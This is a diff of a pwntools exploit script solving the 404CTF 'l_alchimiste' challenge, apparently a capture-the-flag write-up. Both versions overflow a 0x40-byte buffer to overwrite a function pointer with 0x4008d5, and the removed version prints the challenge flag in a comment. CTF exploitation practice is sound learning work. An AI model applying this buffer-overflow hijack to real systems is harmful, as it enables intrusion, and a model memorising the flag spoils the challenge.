@@ -1,51 +1,61 @@
 from pwn import *
+warnings.filterwarnings("ignore", category=BytesWarning)
+#io = process("./l_alchimiste")
+HOST, PORT = "challenges.404ctf.fr", 30944 
+io = remote(HOST, PORT)
 
-HOST = "challenges.404ctf.fr"
-PORT = 30944
 
-r = remote(HOST, PORT)
+def getStrength():
+	io.recvuntil(">>> ")
+	io.sendline("2")
+	io.recvuntil(">>> ")
+	io.sendline("1")
 
-def recv_prompt(r):
-    data = r.recvuntil(b">>> ")
-    print(data.decode())
+def checkStrength():
+	io.recvuntil(">>> ")
+	io.sendline("4")
+	text = io.recvuntil("1:")
+	print(text)
+	if b"FOR: 160" in text:
+		return 1
+	else:
+		return 0
 
-def recv_carac(r):
-    r.sendline(b"4")
-    carac = r.recvuntil(b">>> ")
-    print(carac.decode())
+def setInteligence():
+	io.recvuntil(">>> ")
+	io.sendline("2")
 
-def recv_flag(r):
-    r.sendline(b"5")
-    flag = r.recvuntil(b"}")
-    print(flag.decode())
+	io.recvuntil(">>> ")
+	io.sendline("3")
+	io.recvuntil("[Vous] : ")
+	io.sendline(b"a"*0x40+p64(0x004008d5))
 
-recv_prompt(r)
-incInt_addr = 0x4008d5
-intelligence_payload = b'A'*0x40 + p64(incInt_addr)
+	io.recvuntil(">>> ")
+	io.sendline("1")
 
-assert len(intelligence_payload) == 0x48
+def checkInteligence():
+	io.recvuntil(">>> ")
+	io.sendline("4")
+	text = io.recvuntil("1:")
+	print(text)
+	if b"INT: 160" in text:
+		return 1
+	else:
+		return 0
 
-for _ in range(5):
-    # Buy strength potion
-    r.sendline(b"1")
-    recv_prompt(r)
-    # Consume it
-    r.sendline(b"2")
-    recv_prompt(r)
+io.recvuntil(">>> ")
+io.sendline("1")
+okStr = 0
+while okStr != 1:
+	getStrength()
+	okStr = checkStrength()
 
-recv_carac(r)
-
-for _ in range(10):
-    # Send message in which we inject incInt function address
-    r.sendline(b"3")
-    r.recvuntil(b" : ")
-    r.sendline(intelligence_payload)
-    recv_prompt(r)
-    # Consume it (will call the function at the injected address)
-    r.sendline(b"2")
-    recv_prompt(r)
-
-recv_carac(r)
-
-recv_flag(r)
-# Flag: 404CTF{P0UrQU01_P4Y3r_QU4ND_135_M075_5UFF153N7}
+okInt = 0 
+while okInt != 1:
+	okInt = checkInteligence()
+	setInteligence()
+io.recvuntil(">>> ")
+io.sendline("5")
+print(io.recvline().decode())
+print(io.recvline().decode())
+print("Flag: ", io.recvline().decode())
